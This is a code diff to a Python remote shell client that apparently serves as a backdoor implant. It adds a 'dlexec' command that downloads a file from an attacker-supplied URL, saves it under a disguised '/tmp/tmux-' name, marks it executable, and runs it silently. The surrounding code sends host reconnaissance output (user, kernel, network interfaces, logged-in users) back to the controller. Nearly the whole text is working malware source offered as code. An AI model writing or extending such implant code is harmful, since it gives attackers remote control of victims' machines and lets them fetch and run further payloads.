@@ -3,8 +3,10 @@
 import os
 import re
 import sys
+import stat
 import time
 import base64
+import random
 import socket
 import os.path
 import urllib2
@@ -73,6 +75,12 @@ def shell_client(host, port):
                         raise Exception('client not deleted')
                 except Exception as e:
                     socksend(s, str(e.message))
+            elif inp.startswith('dlexec'):
+                try:
+                    shell_dlexec(inp)
+                    socksend(s, 'done')
+                except Exception as e:
+                    socksend(s, str(e.message))
             else:
                 socksend(s, 'Unrecognized')
         except socket.error as e:
@@ -96,6 +104,16 @@ def shell_recon():
     ipcmd = 'ip addr' if 'no' in cmd_exec('which ifconfig') else 'ifconfig'
     exec_str = 'exec "whoami" "id" "uname -a" "lsb_release -a" "{}" "w" "who -a"'.format(ipcmd)
     return shell_exec(exec_str)
+
+
+def shell_dlexec(inp):
+    r = urllib2.urlopen(inp.split()[1])
+    rand = str(random.random())[2:6]
+    tmp = '/tmp/tmux-{}'.format(rand)
+    with open(tmp, 'w') as f:
+        f.write(r.read())
+        os.fchmod(f.fileno(), stat.S_IRWXU)
+    sp.Popen(tmp, stdout=open(os.devnull, 'w'), stderr=sp.STDOUT)
 
 
 def cmd_exec(cmd):
